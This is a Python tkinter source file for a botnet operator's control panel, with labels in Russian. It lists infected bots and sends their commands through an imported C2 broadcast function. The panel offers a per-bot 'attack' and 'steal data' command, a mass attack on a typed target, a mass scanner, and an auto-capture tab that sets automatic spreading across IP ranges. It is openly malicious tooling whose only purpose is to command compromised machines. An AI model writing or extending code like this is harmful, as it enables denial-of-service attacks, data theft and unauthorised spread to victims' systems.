import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import json, os, threading
import folium, webbrowser
from botnet.c2 import broadcast_command
from utils.logger import log
from utils.widgets import ToolTip
from botnet.auto_spreader import AutoSpreader

class BotnetTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.bot_data = []
        self.spreader = AutoSpreader()
        self.build_ui()
        self.load_bots()

    def build_ui(self):
        nb = ttk.Notebook(self)
        nb.pack(fill=tk.BOTH, expand=True)
        # Список
        list_frame = ttk.Frame(nb)
        nb.add(list_frame, text="Список")
        control_frame = ttk.Frame(list_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        refresh_btn = ttk.Button(control_frame, text="Обновить", command=self.load_bots)
        refresh_btn.pack(side=tk.LEFT, padx=2)
        mass_btn = ttk.Button(control_frame, text="Массовая атака", command=self.mass_attack)
        mass_btn.pack(side=tk.LEFT, padx=2)
        scan_btn = ttk.Button(control_frame, text="Масс-сканер", command=self.mass_scanner)
        scan_btn.pack(side=tk.LEFT, padx=2)
        filter_frame = ttk.Frame(list_frame)
        filter_frame.pack(fill=tk.X, padx=5)
        ttk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
        self.filter_entry = ttk.Entry(filter_frame, width=30)
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        self.filter_entry.bind("<KeyRelease>", lambda e: self.apply_filter())
        columns = ("ID", "IP", "OS", "Status", "Bandwidth")
        self.tree = ttk.Treeview(list_frame, columns=columns, show="headings")
        for col in columns:
            self.tree.heading(col, text=col, command=lambda c=col: self.sort_by(c))
            self.tree.column(col, width=120)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.tree.bind("<Button-3>", self.show_context_menu)
        self.context_menu = tk.Menu(self, tearoff=0)
        self.context_menu.add_command(label="Атаковать", command=self.context_attack)
        self.context_menu.add_command(label="Сбор данных", command=self.context_steal)
        self.progress = ttk.Progressbar(list_frame, mode="indeterminate")
        self.progress.pack(fill=tk.X, padx=5, pady=2)
        self.status_label = ttk.Label(list_frame, text="Ботов: 0")
        self.status_label.pack(anchor=tk.W, padx=5)
        # Автозахват
        auto_frame = ttk.Frame(nb)
        nb.add(auto_frame, text="Автозахват")
        ttk.Label(auto_frame, text="Статус:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.auto_status_label = ttk.Label(auto_frame, text="Неактивен")
        self.auto_status_label.grid(row=0, column=1, sticky=tk.W)
        self.toggle_btn = ttk.Button(auto_frame, text="Запустить", command=self.toggle_spreader)
        self.toggle_btn.grid(row=1, column=0, padx=5, pady=5)
        ttk.Button(auto_frame, text="Применить настройки", command=self.reload_spreader).grid(row=1, column=1, padx=5)
        ttk.Label(auto_frame, text="Интервал (мин):").grid(row=2, column=0, padx=5, sticky=tk.W)
        self.interval_var = tk.StringVar(value="30")
        ttk.Entry(auto_frame, textvariable=self.interval_var, width=10).grid(row=2, column=1, padx=5, sticky=tk.W)
        ttk.Label(auto_frame, text="Диапазоны:").grid(row=3, column=0, padx=5, sticky=tk.W)
        self.ranges_text = tk.Text(auto_frame, height=4, width=30)
        self.ranges_text.grid(row=3, column=1, padx=5, pady=5)
        self.load_auto_settings()

    def load_bots(self):
        if os.path.exists("bots.json"):
            with open("bots.json", "r") as f:
                raw_data = json.load(f)
        else:
            raw_data = []
        self.bot_data = []
        for item in raw_data:
            if isinstance(item, dict):
                bot = item.copy()
            elif isinstance(item, str):
                bot = {"id": item, "ip": "", "os": "", "status": "offline", "bandwidth": 0}
            else:
                continue
            bot.setdefault("id", "unknown")
            bot.setdefault("ip", "")
            bot.setdefault("os", "")
            bot.setdefault("status", "offline")
            bot.setdefault("bandwidth", 0)
            self.bot_data.append(bot)
        self.populate_tree()
        self.status_label.config(text=f"Ботов: {len(self.bot_data)}")

    def populate_tree(self, filtered=None):
        self.tree.delete(*self.tree.get_children())
        data = filtered if filtered is not None else self.bot_data
        for bot in data:
            status = bot.get("status","offline")
            tag = "online" if status == "online" else "offline"
            self.tree.insert("", tk.END, values=(
                bot.get("id",""),
                bot.get("ip",""),
                bot.get("os",""),
                status,
                f"{bot.get('bandwidth',0)} Mbps"
            ), tags=(tag,))
        self.tree.tag_configure('online', foreground='green')
        self.tree.tag_configure('offline', foreground='red')

    def apply_filter(self):
        text = self.filter_entry.get().lower()
        if not text:
            self.populate_tree()
            return
        filtered = [b for b in self.bot_data if text in str(b).lower()]
        self.populate_tree(filtered)

    def sort_by(self, col):
        idx = ["id","ip","os","status","bandwidth"].index(col.lower())
        self.bot_data.sort(key=lambda b: str(b.get(col.lower(),"")))
        self.populate_tree()

    def show_context_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.context_menu.post(event.x_root, event.y_root)

    def get_selected_bot(self):
        selection = self.tree.selection()
        if selection:
            values = self.tree.item(selection[0], 'values')
            return {'id': values[0], 'ip': values[1], 'os': values[2], 'status': values[3], 'bandwidth': values[4]}
        return None

    def context_attack(self):
        bot = self.get_selected_bot()
        if bot:
            target = simpledialog.askstring("Атака", "Цель:")
            if target:
                broadcast_command({"action":"attack","target":target,"bot_id":bot['id']})
    def context_steal(self):
        bot = self.get_selected_bot()
        if bot:
            broadcast_command({"action":"steal","bot_id":bot['id']})
    def mass_attack(self):
        target = simpledialog.askstring("Массовая атака", "Цель:")
        if target:
            self.progress.start()
            threading.Thread(target=lambda: broadcast_command({"action":"attack","target":target})).start()
            self.progress.stop()
    def mass_scanner(self):
        ip_range = simpledialog.askstring("Сканер", "Диапазон:")
        if ip_range:
            log(f"Сканирую {ip_range}")
    def load_auto_settings(self):
        try:
            with open("avz_settings.json") as f:
                s = json.load(f)
            self.interval_var.set(str(s.get("auto_spread_interval_min",30)))
            self.ranges_text.delete(1.0,tk.END)
            for r in s.get("auto_spread_ranges",[]):
                self.ranges_text.insert(tk.END, r+"\n")
            if s.get("auto_spread_enabled"):
                self.auto_status_label.config(text="Активен")
                self.toggle_btn.config(text="Остановить")
        except: pass
    def toggle_spreader(self):
        if self.spreader.running:
            self.spreader.stop()
            self.auto_status_label.config(text="Неактивен")
            self.toggle_btn.config(text="Запустить")
        else:
            self.save_auto_settings()
            self.spreader.load_settings("avz_settings.json")
            self.spreader.start()
            self.auto_status_label.config(text="Активен")
            self.toggle_btn.config(text="Остановить")
    def save_auto_settings(self):
        try:
            with open("avz_settings.json","r") as f:
                s = json.load(f)
            s["auto_spread_interval_min"] = int(self.interval_var.get())
            s["auto_spread_ranges"] = self.ranges_text.get(1.0,tk.END).strip().split("\n")
            s["auto_spread_enabled"] = True
            with open("avz_settings.json","w") as f:
                json.dump(s, f, indent=2)
            messagebox.showinfo("Настройки", "Сохранено")
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))
    def reload_spreader(self):
        self.save_auto_settings()
        self.spreader.load_settings("avz_settings.json")
